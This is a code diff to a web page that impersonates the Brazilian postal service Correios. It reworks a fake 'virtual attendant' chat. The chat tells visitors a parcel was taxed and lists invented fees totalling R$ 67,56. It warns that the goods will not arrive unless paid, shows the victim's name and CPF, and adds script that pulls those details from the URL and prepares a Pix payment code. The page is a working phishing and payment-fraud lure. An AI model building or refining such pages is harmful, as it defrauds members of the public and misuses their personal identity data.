@@ -585,49 +585,91 @@
       }
     }
 
-    /* Estilos para o chat */
+    /* Estilos para o chat modificado */
     #chat-container {
       display: none;
       max-width: 600px;
       margin: 20px auto;
-      border: 1px solid #ddd;
+      background-color: #fff;
       border-radius: 10px;
-      overflow: hidden;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      overflow: hidden;
     }
 
-    .chat-message {
+    .chat-header {
+      background-color: #003157;
+      color: white;
+      padding: 15px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    .chat-messages {
+      padding: 15px;
+      max-height: 400px;
+      overflow-y: auto;
+    }
+
+    .message {
+      margin-bottom: 15px;
       display: flex;
-      padding: 10px;
-      border-bottom: 1px solid #eee;
+      align-items: flex-start;
     }
 
-    .avatar {
+    .bot-message {
+      justify-content: flex-start;
+    }
+
+    .user-message {
+      justify-content: flex-end;
+    }
+
+    .message-avatar {
       width: 40px;
       height: 40px;
       border-radius: 50%;
       margin-right: 10px;
-      object-fit: cover;
+      background-color: #003157;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
     }
 
     .message-content {
-      flex: 1;
+      max-width: 70%;
+      padding: 10px 15px;
+      border-radius: 18px;
+      position: relative;
     }
 
-    .message-sender {
-      font-weight: bold;
-      color: #003157;
-      margin-bottom: 5px;
+    .bot-message .message-content {
+      background-color: #f0f0f0;
+      border-top-left-radius: 0;
+    }
+
+    .user-message .message-content {
+      background-color: #003157;
+      color: white;
+      border-top-right-radius: 0;
     }
 
     .message-text {
-      color: #333;
+      margin: 0;
+      line-height: 1.4;
     }
 
     .message-image {
       max-width: 100%;
-      border-radius: 5px;
-      margin-top: 5px;
+      border-radius: 8px;
+      margin-top: 8px;
+    }
+
+    .chat-input {
+      display: flex;
+      padding: 10px;
+      border-top: 1px solid #eee;
     }
 
     .chat-button {
@@ -637,9 +679,10 @@
       padding: 10px 15px;
       border-radius: 5px;
       cursor: pointer;
-      margin: 10px;
+      margin: 10px auto;
       display: block;
       width: calc(100% - 20px);
+      font-weight: bold;
     }
 
     .chat-button:hover {
@@ -648,6 +691,18 @@
 
     .hidden {
       display: none;
+    }
+
+    .status-info {
+      background-color: #f8f9fa;
+      border-left: 4px solid #003157;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 14px;
+    }
+
+    .status-info strong {
+      color: #003157;
     }
   </style>
 </head>
@@ -873,52 +928,61 @@
       </div>
     </section>
 
-    <!-- Chat Container -->
+    <!-- Chat Container modificado -->
     <div id="chat-container">
-      <!-- Parte 1 - Exibida automaticamente -->
-      <div id="part1" class="chat-message">
-        <img src="images/avatar.png" alt="Atendente" class="avatar">
-        <div class="message-content">
-          <div class="message-sender">Priscilla</div>
-          <div class="message-text">Bem-vindo(a) ao atendimento Virtual dos Correios.</div>
-          <div class="message-text">Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada</div>
-          <img src="images/image1.png" alt="Imagem 1" class="message-image">
-          <div class="message-text"><span id="chat-nome"></span>, você deseja solicitar a liberação da sua mercadoria?</div>
+      <div class="chat-header">
+        Atendimento Virtual dos Correios
+      </div>
+      
+      <div class="chat-messages">
+        <!-- Mensagem inicial do bot -->
+        <div class="message bot-message">
+          <div class="message-avatar">C</div>
+          <div class="message-content">
+            <p class="message-text">Bem-vindo(a) ao atendimento Virtual dos Correios.</p>
+            <p class="message-text">Identificamos no nosso Sistema que uma de suas Encomendas Foi Taxada</p>
+            <img src="images/image1.png" alt="Imagem de encomenda tributada" class="message-image">
+            <p class="message-text"><span id="chat-nome"></span>, você deseja solicitar a liberação da sua mercadoria?</p>
+          </div>
+        </div>
+        
+        <!-- Mensagem de status (inicialmente oculta) -->
+        <div id="status-message" class="status-info hidden">
+          <p><strong>PACKET STANDARD IMPORTAÇÃO</strong></p>
+          <p>Previsão de entrega: <span id="previsao-entrega"></span></p>
+        </div>
+        
+        <!-- Mensagem sobre a taxa (inicialmente oculta) -->
+        <div id="taxa-message" class="message bot-message hidden">
+          <div class="message-avatar">C</div>
+          <div class="message-content">
+            <img src="images/image2.png" alt="Imagem sobre taxas" class="message-image">
+            <p class="message-text">Por que essa taxa?</p>
+            <p class="message-text">A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:</p>
+            <p class="message-text">- Taxa de liberação: Cobrança padrão para processos alfandegários.</p>
+            <p class="message-text">- Peso da mercadoria – Valor ajustado conforme o peso do item.</p>
+            <p class="message-text">- Despacho postal – Serviço de liberação e envio.</p>
+          </div>
+        </div>
+        
+        <!-- Mensagem de confirmação (inicialmente oculta) -->
+        <div id="confirmacao-message" class="message bot-message hidden">
+          <div class="message-avatar">C</div>
+          <div class="message-content">
+            <img src="images/image3.png" alt="Imagem de confirmação" class="message-image">
+            <p class="message-text">GUIA DE PAGAMENTO GERADA COM SUCESSO!</p>
+            <p class="message-text">Taxa de Liberação: R$ 23,89</p>
+            <p class="message-text">Peso da mercadoria: R$ 19,50</p>
+            <p class="message-text">Despacho postal: R$ 24,17</p>
+            <p class="message-text">Total a Pagar: R$ 67,56</p>
+            <p class="message-text">Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não chegará até você.</p>
+            <p class="message-text">ATENÇÃO, <span id="chat-nome2"></span></p>
+            <p class="message-text">CPF: <span id="chat-cpf"></span></p>
+            <p class="message-text">Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span id="chat-data"></span></p>
+          </div>
         </div>
       </div>
-
-      <!-- Parte 2 - Exibida após clicar no botão SIM -->
-      <div id="part2" class="chat-message hidden">
-        <img src="images/avatar.png" alt="Atendente" class="avatar">
-        <div class="message-content">
-          <div class="message-sender">Priscilla</div>
-          <img src="images/image2.png" alt="Imagem 2" class="message-image">
-          <div class="message-text">Por que essa taxa?</div>
-          <div class="message-text">A taxa cobre os custos de liberação alfandegária e envio da sua encomenda. Ela inclui:</div>
-          <div class="message-text">- Taxa de liberação: Cobrança padrão para processos alfandegários.</div>
-          <div class="message-text">- Peso da mercadoria – Valor ajustado conforme o peso do item.</div>
-          <div class="message-text">- Despacho postal – Serviço de liberação e envio.</div>
-        </div>
-      </div>
-
-      <!-- Parte 3 - Exibida após clicar no botão "Entendi, continuar!" -->
-      <div id="part3" class="chat-message hidden">
-        <img src="images/avatar.png" alt="Atendente" class="avatar">
-        <div class="message-content">
-          <div class="message-sender">Priscilla</div>
-          <img src="images/image3.png" alt="Imagem 3" class="message-image">
-          <div class="message-text">GUIA DE PAGAMENTO GERADA COM SUCESSO!</div>
-          <div class="message-text">Taxa de Liberação: R$ 23,89</div>
-          <div class="message-text">Peso da mercadoria: R$ 19,50</div>
-          <div class="message-text">Despacho postal: R$ 24,17</div>
-          <div class="message-text">Total a Pagar: R$ 67,56</div>
-          <div class="message-text">Comprovante gerado com sucesso, caso não efetue o pagamento, a sua mercadoria não chegará até você.</div>
-          <div class="message-text">ATENÇÃO, <span id="chat-nome2"></span></div>
-          <div class="message-text">CPF: <span id="chat-cpf"></span></div>
-          <div class="message-text">Após a confirmação do pagamento, sua encomenda será liberada amanhã dia <span id="chat-data"></span></div>
-        </div>
-      </div>
-
+      
       <!-- Botões do chat -->
       <button id="btn-sim" class="chat-button">SIM</button>
       <button id="btn-continuar" class="chat-button hidden">Entendi, continuar!</button>
@@ -1169,6 +1233,15 @@
       document.getElementById("chat-nome2").textContent = document.getElementById("res-nome").textContent;
       document.getElementById("chat-cpf").textContent = document.getElementById("res-cpf").textContent;
       document.getElementById("chat-data").textContent = getDataAmanha();
+      
+      // Atualiza a previsão de entrega
+      const hoje = new Date();
+      const entrega = new Date(hoje);
+      entrega.setDate(hoje.getDate() + 3);
+      const dd = entrega.getDate().toString().padStart(2, '0');
+      const mm = (entrega.getMonth() + 1).toString().padStart(2, '0');
+      const yyyy = entrega.getFullYear();
+      document.getElementById("previsao-entrega").textContent = `${dd}/${mm}/${yyyy}`;
     });
 
     // Máscaras para CPF e CEP
@@ -1186,30 +1259,73 @@
       e.target.value = value.substring(0, 9);
     });
 
-    // Lógica do chat
+    // Lógica do chat modificada
     document.getElementById('btn-sim').addEventListener('click', function() {
-      document.getElementById('part2').classList.remove('hidden');
+      // Mostra a mensagem de status e sobre a taxa
+      document.getElementById('status-message').classList.remove('hidden');
+      document.getElementById('taxa-message').classList.remove('hidden');
+      
+      // Esconde o botão SIM e mostra o botão CONTINUAR
       document.getElementById('btn-sim').classList.add('hidden');
       document.getElementById('btn-continuar').classList.remove('hidden');
       
-      // Rolagem automática para a parte 2
-      document.getElementById('part2').scrollIntoView({ behavior: 'smooth' });
+      // Rolagem automática para o final do chat
+      const chatMessages = document.querySelector('.chat-messages');
+      chatMessages.scrollTop = chatMessages.scrollHeight;
     });
 
     document.getElementById('btn-continuar').addEventListener('click', function() {
-      document.getElementById('part3').classList.remove('hidden');
+      // Mostra a mensagem de confirmação
+      document.getElementById('confirmacao-message').classList.remove('hidden');
+      
+      // Esconde o botão CONTINUAR e mostra o botão ACESSAR GUIA
       document.getElementById('btn-continuar').classList.add('hidden');
       document.getElementById('btn-acessar-guia').classList.remove('hidden');
       
-      // Rolagem automática para a parte 3
-      document.getElementById('part3').scrollIntoView({ behavior: 'smooth' });
+      // Rolagem automática para o final do chat
+      const chatMessages = document.querySelector('.chat-messages');
+      chatMessages.scrollTop = chatMessages.scrollHeight;
     });
 
     document.getElementById('btn-acessar-guia').addEventListener('click', function() {
       alert('Redirecionando para a página de pagamento...');
       // Aqui você pode adicionar o redirecionamento real para a página de pagamento
     });
+
+    // Script para gerar o Pix (similar ao exemplo)
+    document.addEventListener("DOMContentLoaded", function () {
+      // Recupera os parâmetros da URL
+      const urlParams = new URLSearchParams(window.location.search);
+      const nome = urlParams.get('nome');
+      const cpf = urlParams.get('cpf');
+
+      // Só gera o Pix se tiver nome e CPF
+      if (!nome || !cpf) {
+          console.error("Parâmetros 'nome' ou 'cpf' ausentes na URL.");
+          return;
+      }
+
+      // Verifica se já tem um Pix salvo
+      if (sessionStorage.getItem("pix_data1")) {
+          console.log("📦 Pix já gerado no sessionStorage.");
+          return;
+      }
+
+      // Simula a geração do Pix (na implementação real, faria uma requisição)
+      console.log("Simulando geração do Pix para:", nome, cpf);
+      
+      // Armazena dados fictícios no sessionStorage
+      const pixData = {
+          pix: "00020126580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426655440000520400005303986540510.005802BR5913FULANO SILVA6008BRASILIA62070503***6304A1B2",
+          externalId: "123456789",
+          status: "pending"
+      };
+
+      sessionStorage.setItem("pix_data1", JSON.stringify(pixData));
+      sessionStorage.setItem("externalId", "123456789");
+      sessionStorage.setItem("pixCode", "00020126580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426655440000520400005303986540510.005802BR5913FULANO SILVA6008BRASILIA62070503***6304A1B2");
+      sessionStorage.setItem("status", "pending");
+    });
   </script>
 </body>
-
 </html>
